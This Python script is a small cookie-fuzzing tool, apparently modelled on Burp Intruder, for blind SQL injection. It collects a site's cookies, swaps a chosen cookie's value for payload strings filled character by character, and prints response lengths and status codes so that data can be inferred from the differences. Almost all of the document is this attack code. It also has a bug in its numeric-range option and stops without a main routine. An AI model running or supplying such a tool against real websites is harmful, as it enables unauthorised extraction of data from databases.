# Intrudent Tool (Burp Intrudent Clone)
# Attack Cookies
# Purpose: To exploit SQL Injection vulnerabilities by comparing server responses to different payloads.
#          Especially is SQL blind injection, Based on the difference of response length or status code to determine data explotion.

# Step:
# S1: Entering URL to get User's Cookies , Payload Injection, Keyword to fuzz, list check. 
# S2: Get the cookies from the response header.
# S3: Fuzzing the keyword with the payloads in the list dict.
# S4: Based on the keyword exiting condition, Checking the response

import requests, string

def get_list_check(n):
    result = {}
    match(n):
        case 1:        
            result = string.ascii_lowercase
        case 2:
            result = string.ascii_uppercase        
        case 3:
            result = string.ascii_letters  
        case 4:
            result = string.ascii_lowercase + string.digits  
        case 5:
            result = string.ascii_uppercase + string.digits      
        case 6:
            min = int(input("Enter min value:"))
            max = int(input("Enter max value:"))
            
            if max < min:
                min = max
            
            for i in range (min, max+1):
                result[i] = str(i)
                
    return result
                

def get_cookies(url):
    try:
        res = requests.get(url, timeout=8)
        cookies = res.cookies.get_dict()
        return cookies
    except requests.RequestException as e:
        print(f"Error fetching cookies: {e}")
        return {}
    
def fuzz_cookie(url, cookies, param, payloads, list_check):
    if param not in cookies:
        print(f"Parameter '{param}' not found in cookies.")
        return
    
    for ch in list_check:
        payload = payloads.replace("{char}", ch)
        new_cookies = cookies.copy()
        new_cookies[param] = payload
        
        r = requests.get(url, cookies=new_cookies)
        
        print(f"Fuzzing with payload: {payload} | Response Length: {len(r.text)} | Status Code: {r.status_code}")